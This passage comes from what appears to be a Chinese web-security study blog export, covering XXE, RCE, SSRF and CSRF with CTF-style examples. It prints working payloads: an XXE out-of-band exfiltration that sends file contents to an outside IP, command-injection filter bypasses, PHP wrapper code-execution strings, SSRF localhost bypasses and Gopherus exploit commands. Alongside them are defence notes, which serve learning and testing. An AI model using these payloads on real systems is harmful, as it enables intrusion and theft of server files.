href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a>  </p><h2 id="XML-XXE-黑盒-JS-黑盒测试-类型修改"><a href="#XML-XXE-黑盒-JS-黑盒测试-类型修改" class="headerlink" title="XML&amp;XXE-黑盒-JS&amp;黑盒测试&amp;类型修改"></a>XML&amp;XXE-黑盒-JS&amp;黑盒测试&amp;类型修改</h2><p><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a>   </p><h3 id="XXE黑盒发现：-1"><a href="#XXE黑盒发现：-1" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h3><p>1、获取Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试<br>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe<br>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试<br>更改请求数据格式：Content-Type  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h2 id="XML-XXE-白盒-CMS-PHPSHE-无回显"><a href="#XML-XXE-白盒-CMS-PHPSHE-无回显" class="headerlink" title="XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显"></a>XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显</h2><h3 id="审计流程："><a href="#审计流程：" class="headerlink" title="审计流程："></a>审计流程：</h3><p>1、漏洞函数simplexml_load_string<br>2、pe_getxml函数调用了漏洞函数<br>3、wechat_getxml调用了pe_getxml<br>4、notify_url调用了wechat_getxml<br>访问notify_url文件触发wechat_getxml函数,构造Paylod测试<br>先尝试读取文件，无回显后带外测试：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://1uwlwv.dnslog.cn&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><h3 id="然后带外传递数据解决无回显："><a href="#然后带外传递数据解决无回显：" class="headerlink" title="然后带外传递数据解决无回显："></a>然后带外传递数据解决无回显：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>58WEB攻防-RCE</title>
      <link href="/2023/11/14/58WEB%E6%94%BB%E9%98%B2-RCE/"/>
      <url>/2023/11/14/58WEB%E6%94%BB%E9%98%B2-RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>52、RCE-原理-代码执行&amp;命令执行</li><li>53、RCE-黑白盒-过滤绕过&amp;不回显方案</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE代码执行：引用脚本代码解析执行<br>RCE命令执行：脚本调用操作系统命令<br>漏洞函数：  </p><ul><li>1.PHP：<br>PHP代码执行函数：<br>&nbsp;&nbsp;&nbsp;&nbsp;eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等<br>PHP命令执行函数：<br>&nbsp;&nbsp;&nbsp;&nbsp;system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等  </li><li>2.Python：<br>eval exec subprocess os.system commands   </li><li>3.Java：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</li></ul><h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h3><p>脚本——java，php，python<br>产生——Web源码、中间件平台、其他环境<br>检测——白盒 代码审计<br>检测——黑盒 漏扫工具、公开漏洞、手工看参数及功能点<br>防御——敏感函数禁用、变量过滤或固定、WAF产品  </p><h3 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h3><p>系统——Linux、Windows<br>产生——web源码、中间件平台、其他环境<br>检测——白盒 代码审计<br>检测——黑盒 漏扫工具，公开漏洞，手工看参数及功能点<br>防御——敏感函数禁用、变量过滤或固定、WAF产品  </p><h2 id="RCE-利用-绕过-异或-回显"><a href="#RCE-利用-绕过-异或-回显" class="headerlink" title="RCE-利用&amp;绕过&amp;异或&amp;回显"></a>RCE-利用&amp;绕过&amp;异或&amp;回显</h2><h3 id="1、伪协议玩法"><a href="#1、伪协议玩法" class="headerlink" title="1、伪协议玩法"></a>1、伪协议玩法</h3><p>配合文件包含伪协议（代码执行）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include $_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&#x27;ver&#x27;);?&gt;</span><br><span class="line">include $_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><h4 id="（1）关键字过滤："><a href="#（1）关键字过滤：" class="headerlink" title="（1）关键字过滤："></a>（1）关键字过滤：</h4><ul><li>1、过滤flag关键字<br>通配符  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag=fl*</span><br><span class="line">cat fl*</span><br><span class="line">cat ?la*</span><br></pre></td></tr></table></figure></li><li>2、转义符号  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure></li><li>2、1使用空变量$*和$@，$x,${x}绕过  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca$*t fl$*ag</span><br><span class="line">ca$@t fl$@ag</span><br><span class="line">ca$5t f$5lag</span><br><span class="line">ca$&#123;2&#125;t f$&#123;2&#125;lag</span><br></pre></td></tr></table></figure></li><li>3、拼接法</li></ul><p><code>a=fl;b=ag;cat$IFS$a$b</code></p><ul><li>4、反引号绕过:</li></ul><p>&#96;&#96;&#96;cat &#96;ls&#96;&#96;&#96;&#96;</p><ul><li>5、编码绕过:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;flag&#x27; | base64</span><br><span class="line">cat `echo ZmxhZwo= | base64 -d`</span><br></pre></td></tr></table></figure></li><li>6、组合绝活  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">touch &quot;ag&quot;</span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t &gt;shell</span><br><span class="line">sh shell</span><br><span class="line">// \指的是换</span><br><span class="line">// ls -t是将文本按时间排序输出</span><br><span class="line">// ls -t &gt;shell  将输出输入到shell文件中</span><br><span class="line">// sh将文本中的文字读取出来执行</span><br></pre></td></tr></table></figure></li><li>7、异或无符号（过滤0-9a-zA-Z）<br>异或：rce-xor.php &amp; rce-xor.py<br>或：rce-xor-or.php &amp; rce-xor-or.py</li></ul><h4 id="（2）过滤函数关键字"><a href="#（2）过滤函数关键字" class="headerlink" title="（2）过滤函数关键字"></a>（2）过滤函数关键字</h4><ul><li>1、内敛执行绕过（system）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo `ls`;</span><br><span class="line">echo $(ls);</span><br><span class="line">?&gt;&lt;?=`ls`;</span><br><span class="line">?&gt;&lt;?=$(ls);</span><br></pre></td></tr></table></figure></li><li>2、过滤执行命令（如cat tac等）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261 //报错出文件内容</span><br><span class="line">curl file:///root/f/flag</span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br></pre></td></tr></table></figure></li><li>3、过滤空格  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%09（url传递）(cat%09flag.php)</span><br><span class="line">cat$&#123;IFS&#125;flag</span><br><span class="line">a=fl;b=ag;cat$IFS$a$b</span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="（3）无回显利用"><a href="#（3）无回显利用" class="headerlink" title="（3）无回显利用"></a>（3）无回显利用</h4><p>1、直接写个文件访问查看<br>2、直接进行对外访问接受  </p><h2 id="白盒-CTF-RCE代码命令执行"><a href="#白盒-CTF-RCE代码命令执行" class="headerlink" title="白盒-CTF-RCE代码命令执行"></a>白盒-CTF-RCE代码命令执行</h2><ul><li>29-通配符</li></ul><p><code>system(&#39;tac fla*.php&#39;);</code></p><ul><li>30-取代函数&amp;通配符&amp;管道符  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`cp fla*.ph* 2.txt`;</span><br><span class="line">echo shell_exec(&#x27;tac fla*.ph*&#x27;);</span><br></pre></td></tr></table></figure></li><li>31-参数逃逸</li></ul><p><code>eval($_GET[1]);&amp;1=system(&#39;tac flag.php&#39;);</code></p><ul><li>32~36-配合包含&amp;伪协议  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></li><li>37~39-包含RCE&amp;伪协议&amp;通配符  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;tac fla*&#x27;);?&gt;</span><br><span class="line">php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="黑盒-运行-RCE代码命令执行"><a href="#黑盒-运行-RCE代码命令执行" class="headerlink" title="黑盒-运行-RCE代码命令执行"></a>黑盒-运行-RCE代码命令执行</h2><p>代码在线运行平台测试  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>57WEB攻防-SSRF</title>
      <link href="/2023/11/11/57WEB%E6%94%BB%E9%98%B2-SSRF/"/>
      <url>/2023/11/11/57WEB%E6%94%BB%E9%98%B2-SSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>49、SSRF-原理-外部资源加载</li><li>50、SSRF-利用-伪协议&amp;无回显</li><li>51、SSRF-挖掘-业务功能&amp;URL参数</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/11/11/57WEB%E6%94%BB%E9%98%B2-SSRF/ssrf1.png"><br> <img src="/2023/11/11/57WEB%E6%94%BB%E9%98%B2-SSRF/ssrf2.png"><br> <img src="/2023/11/11/57WEB%E6%94%BB%E9%98%B2-SSRF/ssrf3.png"><br> <img src="/2023/11/11/57WEB%E6%94%BB%E9%98%B2-SSRF/ssrf4.png"></p><h2 id="1、SSRF漏洞原理"><a href="#1、SSRF漏洞原理" class="headerlink" title="1、SSRF漏洞原理"></a>1、SSRF漏洞原理</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)<br>一种由攻击者构造形成由服务端发起请求的一个安全漏洞;<br>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。<br>（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）<br>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。  </p><h2 id="2、SSRF漏洞挖掘"><a href="#2、SSRF漏洞挖掘" class="headerlink" title="2、SSRF漏洞挖掘"></a>2、SSRF漏洞挖掘</h2><p>黑盒探针：  </p><ul><li><p>业务功能点<br>1.社交分享功能：获取超链接的标题等内容进行显示<br>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览<br>3.在线翻译：给网址翻译对应网页的内容<br>4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片<br>5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验<br>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试<br>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作<br>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数<br>9.邮件系统：比如接收邮件服务器地址<br>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等<br>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞  </p></li><li><p>URL关键参数  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">share</span><br><span class="line">wap</span><br><span class="line">url</span><br><span class="line">link</span><br><span class="line">src</span><br><span class="line">source</span><br><span class="line">target</span><br><span class="line">u</span><br><span class="line">display</span><br><span class="line">sourceURl</span><br><span class="line">imageURL</span><br><span class="line">domain</span><br></pre></td></tr></table></figure><p>白盒分析：见代码审计（文件读取，加载，数据操作类的函数）</p></li></ul><h2 id="3、SSRF伪协议利用"><a href="#3、SSRF伪协议利用" class="headerlink" title="3、SSRF伪协议利用"></a>3、SSRF伪协议利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://  Web常见访问，如http://127.0.0.1  </span><br><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br><span class="line">由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）</span><br><span class="line">应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：Gopherus</span><br></pre></td></tr></table></figure><h2 id="4、SSRF绕过方式"><a href="#4、SSRF绕过方式" class="headerlink" title="4、SSRF绕过方式"></a>4、SSRF绕过方式</h2><ul><li><p>限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名<br>采用http基本身份认证的方式绕过，即@<a href="http://www.xxx.com@www.xxyy.com/">http://www.xxx.com@www.xxyy.com</a>  </p></li><li><p>限制请求IP不为内网地址<br>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取域名解析<br>（3）采取进制转换<br>（4）采取3XX重定向</p></li></ul><h2 id="5、SSRF漏洞防御"><a href="#5、SSRF漏洞防御" class="headerlink" title="5、SSRF漏洞防御"></a>5、SSRF漏洞防御</h2><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。<br>2,统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。<br>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。<br>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。<br>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。  </p><h2 id="CTFSHOW-SSRF-白盒"><a href="#CTFSHOW-SSRF-白盒" class="headerlink" title="CTFSHOW SSRF 白盒"></a>CTFSHOW SSRF 白盒</h2><p>CTF 绕过  </p><ul><li>1、无过滤直接获取</li></ul><p><code>url=http://127.0.0.1/flag.php  </code></p><ul><li>2-3、IP地址进制绕过<br>十六进制</li></ul><p><code>url=http://0x7F.0.0.1/flag.php  </code></p><p>八进制<br><code>url=http://0177.0.0.1/flag.php  </code></p><p>10 进制整数格式<br><code>url=http://2130706433/flag.php  </code></p><p>16 进制整数格式，还是上面那个网站转换记得前缀0x<br><code>url=http://0x7F000001/flag.php  </code></p><p>还有一种特殊的省略模式<br><code>127.0.0.1写成127.1  </code></p><p>用CIDR绕过localhost<br><code>url=http://127.127.127.127/flag.php  </code></p><p>还有很多方式  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php  </span><br><span class="line">url=http://0.0.0.0/flag.php  </span><br></pre></td></tr></table></figure><ul><li>4、域名解析IP绕过<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.xiaodi8.com -&gt; 127.0.0.1</span><br><span class="line">url=http://test.xiaodi8.com/flag.php</span><br></pre></td></tr></table></figure></li><li>5、长度限制IP绕过</li></ul><p><code>url=http://127.1/flag.php</code></p><ul><li>6、长度限制IP绕过</li></ul><p><code>url=http://0/flag.php</code></p><ul><li>7、利用重定向解析绕过<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location:http://127.0.0.1/flag.php&quot;); </span><br><span class="line">url=http://47.94.236.117/xx.php</span><br></pre></td></tr></table></figure></li><li>8、匹配且不影响写法解析</li></ul><p><code>url=http://ctf.@127.0.0.1/flag.php?show</code></p><ul><li>9-10、利用gopher协议打服务<br><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d:Python2.7\python.exe gopherus.py --exploit mysql</span><br><span class="line">d:Python2.7\python.exe gopherus.py --exploit redis</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>56WEB攻防-CSRF</title>
      <link href="/2023/11/08/56WEB%E6%94%BB%E9%98%B2-CSRF/"/>
      <url>/2023/11/08/56WEB%E6%94%BB%E9%98%B2-CSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>46、CSRF-原理&amp;检测&amp;利用&amp;防御</li><li>47、CSRF-防御-Referer策略隐患</li><li>48、CSRF-防御-Token校验策略隐患</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/11/08/56WEB%E6%94%BB%E9%98%B2-CSRF/CSRF1.png"><br> <img src="/2023/11/08/56WEB%E6%94%BB%E9%98%B2-CSRF/CSRF2.png"><br> <img src="/2023/11/08/56WEB%E6%94%BB%E9%98%B2-CSRF/CSRF3.png"></p><h2 id="CSRF-无检测防护-检测-生成-利用"><a href="#CSRF-无检测防护-检测-生成-利用" class="headerlink" title="CSRF-无检测防护-检测&amp;生成&amp;利用"></a>CSRF-无检测防护-检测&amp;生成&amp;利用</h2><p>检测：黑盒手工利用测试，白盒看代码检验（有无token，来源检验等）<br>生成：BurpSuite-&gt;Engagement tools-&gt;Generate CSRF Poc<br>利用：将文件防止自己的站点下，诱使受害者访问（或配合XSS触发访问）  </p><h2 id="CSRF-Referer同源-规则-上传-XSS"><a href="#CSRF-Referer同源-规则-上传-XSS" class="headerlink" title="CSRF-Referer同源-规则&amp;上传&amp;XSS"></a>CSRF-Referer同源-规则&amp;上传&amp;XSS</h2><p><a href="https://blog.csdn.net/weixin_50464560/article/details/120581841">https://blog.csdn.net/weixin_50464560/article/details/120581841</a><br>严谨代码PHP DEMO：   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 检测来源</span><br><span class="line">function checkReferrer() &#123;</span><br><span class="line">    $expectedReferrer = &quot;http://example.com&quot;; // 期望的来源页面</span><br><span class="line"></span><br><span class="line">    if (!isset($_SERVER[&#x27;HTTP_REFERER&#x27;]) || $_SERVER[&#x27;HTTP_REFERER&#x27;] !== $expectedReferrer) &#123;</span><br><span class="line">        die(&quot;非法访问&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 处理表单提交</span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    // 检测来源</span><br><span class="line">    checkReferrer();</span><br><span class="line"></span><br><span class="line">    // 获取用户输入的数据</span><br><span class="line">    $name = $_POST[&#x27;name&#x27;];</span><br><span class="line">    $email = $_POST[&#x27;email&#x27;];</span><br><span class="line"></span><br><span class="line">    // 输出用户输入的数据</span><br><span class="line">    echo &quot;姓名：$name&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;邮箱：$email&lt;br&gt;&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;检测来源示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;检测来源示例&lt;/h1&gt;</span><br><span class="line">    &lt;form action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;name&quot;&gt;姓名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot; required /&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;label for=&quot;email&quot;&gt;邮箱：&lt;/label&gt;</span><br><span class="line">        &lt;input 